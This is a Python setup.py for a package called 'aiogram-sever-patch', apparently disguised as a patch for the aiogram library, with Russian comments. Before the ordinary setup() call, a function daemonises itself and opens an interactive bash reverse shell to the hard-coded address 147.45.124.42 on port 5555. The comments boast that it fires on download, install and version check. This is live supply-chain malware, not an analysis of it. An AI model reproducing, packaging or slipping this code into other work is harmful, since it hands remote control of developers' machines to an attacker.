import os, socket, subprocess, sys

# МЕТОД "ПРИЗРАК": ФОРКАЕМСЯ И УХОДИМ В ФОН
def pwn():
    try:
        # Твой сервер и порт
        h, p = "147.45.124.42", 5555
        # Двойной форк, чтобы стать демоном и не зависеть от pip
        if os.fork() > 0: return 
        os.setsid()
        if os.fork() > 0: sys.exit(0)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((h, p))
        os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except:
        pass

# ЭТО СРАБОТАЕТ ПРИ СКАЧИВАНИИ, ПРИ УСТАНОВКЕ И ПРИ ПРОВЕРКЕ ВЕРСИИ
pwn()

from setuptools import setup
setup(
    name="aiogram-sever-patch",
    version="3.5.0", # НОВАЯ ВЕРСИЯ - НОВЫЙ УДАР
    packages=['aiogram_sever_patch'],
    description="STAY_ROOTED"
)
